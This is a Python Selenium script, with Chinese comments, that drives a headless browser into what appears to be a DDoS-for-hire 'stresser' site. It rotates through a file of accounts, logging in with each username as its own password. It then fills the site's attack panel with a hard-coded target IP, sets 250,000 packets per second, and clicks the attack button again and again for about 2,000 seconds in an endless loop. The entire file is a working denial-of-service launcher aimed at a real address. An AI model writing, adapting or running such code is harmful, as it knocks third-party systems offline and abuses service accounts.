# -*- coding: utf-8 -*-
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from time import sleep

ip = '46.17.43.3'

account_file = 'account'

with open(account_file,'r',encoding='utf-8') as file:
    lines = file.readlines()

line_count = len(lines)
count = 0

while True:
    try:
        current_line = lines[count % line_count]
        username = current_line
        pwd = username
        chrome_options = Options()
        chrome_options.add_argument("--headless")  # 运行无头版本的Chrome
        chrome_options.add_argument("ignore-certificate-erros")  # 忽略证书错误
        chrome_options.add_argument("--no-sandbox")  # 在无沙盒模式下运行
        chrome_options.add_argument("--disable-dev-shm-usage")  # overcome limited
        service = Service('/usr/local/bin/chromedriver')
        driver = webdriver.Chrome(service=service,options=chrome_options)
        driver.implicitly_wait(10)

        # 登录
        driver.get('https://stresslab.su/u/login')
        driver.find_element(By.ID,'username').send_keys(username)
        driver.find_element(By.ID,'password').send_keys(pwd)
        driver.find_element(By.ID,'_login').click()
        sleep(1)

        #进入攻击面板,填写攻击信息
        driver.get('https://stresslab.su/u/attacks')
        driver.find_element(By.ID,'target').send_keys(ip)
        pps = driver.find_element(By.ID,'pps_')
        driver.execute_script("arguments[0].value = arguments[1];", pps, "250000")
        attack_time = driver.find_element(By.ID,'time')
        attack_time.clear()
        attack_time.send_keys('200')
        attack_button = driver.find_element(By.ID,'_na_l4')
        attack_button.click()
        sleep(1)
        end_time = time.time() + 2000
    except:
        driver.quit()
        count += 1
        continue
    while True:
        try:
            if time.time() > end_time:
                break
            sleep(10)
            attack_button.click()
        except:
            pass

    driver.quit()
    count += 1